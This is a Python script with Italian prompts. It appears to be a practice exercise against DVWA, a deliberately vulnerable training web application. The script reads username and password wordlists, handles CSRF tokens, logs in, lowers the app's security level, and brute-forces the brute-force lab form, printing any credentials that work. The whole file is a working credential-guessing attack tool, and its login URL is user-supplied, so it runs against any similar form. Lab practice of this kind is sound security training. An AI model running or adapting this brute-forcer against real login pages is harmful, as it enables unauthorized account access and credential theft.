import os
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

def get_csrf_token(session, url, token_name='user_token'):
    response = session.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': token_name})['value']
    return token

def load_credentials(file_path):
    if not os.path.isfile(file_path):
        print(Fore.RED + f"Il file {file_path} non esiste." + Style.RESET_ALL)
        exit(1)
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

def main():
    # Avvia colorama
    init()

    url_login = input("Inserisci l'URL della pagina di login: ")
    user_file = input("Inserisci il file degli username: ")
    password_file = input("Inserisci il file delle password: ")
    indirizzo_ip = input("Inserisci l'indirizzo IP: ")
    url_sicurezza = f"http://{indirizzo_ip}/dvwa/security.php"
    url_forza_bruta = f"http://{indirizzo_ip}/dvwa/vulnerabilities/brute/"

    session = requests.Session()
    csrf_token = get_csrf_token(session, url_login, token_name='user_token')

    usernames = load_credentials(user_file)
    passwords = load_credentials(password_file)

    # Tentativi di login
    for username in usernames:
        for password in passwords:
            print(Fore.YELLOW + f"Tentativo con Username: {username} e Password: {password}" + Style.RESET_ALL)
            data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': csrf_token,
            }
            response = session.post(url_login, data=data)
            if "Login failed" not in response.text:
                print(Fore.GREEN + "Login effettuato con successo!" + Style.RESET_ALL)
                break
        else:
            continue
        break
    else:
        print(Fore.RED + "Fallito: Nessun username e password valido trovato" + Style.RESET_ALL)
        return

    # Cambia il livello di sicurezza
    livello_sicurezza = input("Scegli il livello di sicurezza (low, medium, high): ")
    csrf_token = get_csrf_token(session, url_sicurezza, token_name='user_token')
    data_sicurezza = {
        'security': livello_sicurezza,
        'seclev_submit': 'Submit',
        'user_token': csrf_token,
    }
    risposta = session.post(url_sicurezza, data=data_sicurezza)
    if risposta.status_code == 200:
        print(Fore.GREEN + "Livello di sicurezza cambiato con successo" + Style.RESET_ALL)
    else:
        print(Fore.RED + "Errore nel cambio del livello di sicurezza." + Style.RESET_ALL)

    # brute-force login
    csrf_token = get_csrf_token(session, url_forza_bruta, token_name='user_token')
    print("Prova di login all'URL:", url_forza_bruta)
    for username in usernames:
        for password in passwords:
            print(Fore.YELLOW + f"Tentativo di login con: {username} - {password}" + Style.RESET_ALL)
            data = {
                'username': username,
                'password': password,
                'Login': 'Login',
                'user_token': csrf_token,
            }
            response = session.post(url_forza_bruta, data=data)
            if "Username and/or password incorrect." not in response.text:
                print(Fore.GREEN + f"Login riuscito con username: {username} e password: {password}" + Style.RESET_ALL)
                break
        else:
            continue
        break
    else:
        print(Fore.RED + "Fallito: Nessun username e password valido trovato" + Style.RESET_ALL)

if __name__ == "__main__":
    main()
